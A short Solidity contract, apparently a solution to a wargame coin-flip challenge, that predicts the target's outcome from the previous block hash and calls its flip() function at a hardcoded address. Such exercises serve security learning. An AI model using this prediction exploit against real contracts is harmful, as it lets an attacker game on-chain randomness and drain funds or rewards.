// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.16;

interface ICoinFlip {
    function consecutiveWins() external view returns (uint);
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    address constant TARGET = address(0x550938eBa932e84b892E8AAd916307F4b390F212);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event Log(uint blockValue, bool side, bool result);

    function myFlip() external returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool result = ICoinFlip(TARGET).flip(side);
        emit Log(blockValue, side, result);
        return result;
    }

    function consecutiveWins() external view returns(uint) {
        return ICoinFlip(TARGET).consecutiveWins();
    }
}
